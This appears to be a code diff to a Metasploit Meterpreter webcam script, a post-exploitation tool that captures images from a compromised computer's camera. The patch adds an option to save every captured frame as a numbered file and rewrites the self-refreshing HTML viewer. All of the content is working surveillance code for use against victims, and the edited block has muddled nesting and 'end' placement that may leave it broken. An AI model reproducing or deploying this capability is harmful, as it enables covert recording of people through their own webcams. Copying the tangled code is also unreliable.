@@ -20,15 +20,17 @@ opts = Rex::Parser::Arguments.new(
   "-q" => [ true, "The JPEG image quality (Default: 50)" ],
   "-g" => [ false, "Send to GUI instead of writing to file" ],
   "-s" => [ true, "Stop recording" ],
-  "-p" => [ true, "The path to the folder images will be saved in (Default: current working directory)"]
+  "-p" => [ true, "The path to the folder images will be saved in (Default: current working directory)" ],
+  "-a" => [ false, "Store copies of all the images capture instead of overwriting the same file (Default: overwrite single file)" ]
 )
-
+iterator = 0
 folderpath = "."
 single = false
 quality = 50
 index = 1
 interval = 1000
 gui = false
+saveAll = false
 opts.parse(args) { |opt, idx, val|
   case opt
   when "-h"
@@ -53,6 +55,8 @@ opts.parse(args) { |opt, idx, val|
     print_line("[*] Stopping webcam")
     client.webcam.webcam_stop
     raise Rex::Script::Completed
+  when "-a"
+    saveAll = true
   end
 }
 
@@ -79,7 +83,8 @@ begin
         'PeerPort' => 16235
       )
   end
-  imagepath = folderpath + ::File::SEPARATOR + "webcam.jpg"
+  imagepath = folderpath + ::File::SEPARATOR + "webcam-" + iterator.to_s.rjust(5, "0") + ".jpg"
+  print_line( "[*] imagepath is #{imagepath}" )
   htmlpath = folderpath + ::File::SEPARATOR + "webcam.htm"
   begin
     if single == true
@@ -97,8 +102,8 @@ begin
     else
       if(!gui)
         ::File.open(htmlpath, 'wb' ) do |fd|
-          fd.write('<html><body><img src="webcam.jpg"></img><script>'+
-            "setInterval('location.reload()',#{interval});</script></body><html>" )
+	  htmlOut = "<html><body><img src=\"webcam-" + iterator.to_s.rjust(5, "0") + ".jpg\"></img><script>setInterval('location.reload()',#{interval});</script></body><html>"
+	   fd.write(htmlOut)
         end
         print_line( "[*] View live stream at: #{htmlpath}" )
         Rex::Compat.open_file(htmlpath)
@@ -111,7 +116,15 @@ begin
         else
           ::File.open( imagepath, 'wb' ) do |fd|
             fd.write( data )
-          end
+        ::File.open(htmlpath, 'wb' ) do |fd|
+	  htmlOut = "<html><body><img src=\"webcam-" + iterator.to_s.rjust(5, "0") + ".jpg\"></img><script>setInterval('location.reload()',#{interval});</script></body><html>"
+	   fd.write(htmlOut)
+	    if(saveAll)
+              iterator = iterator + 1
+              imagepath = folderpath + ::File::SEPARATOR + "webcam-" + iterator.to_s.rjust(5, "0") + ".jpg"
+            end
+        end
+      end
         end
         select(nil, nil, nil, interval/1000.0)
       end
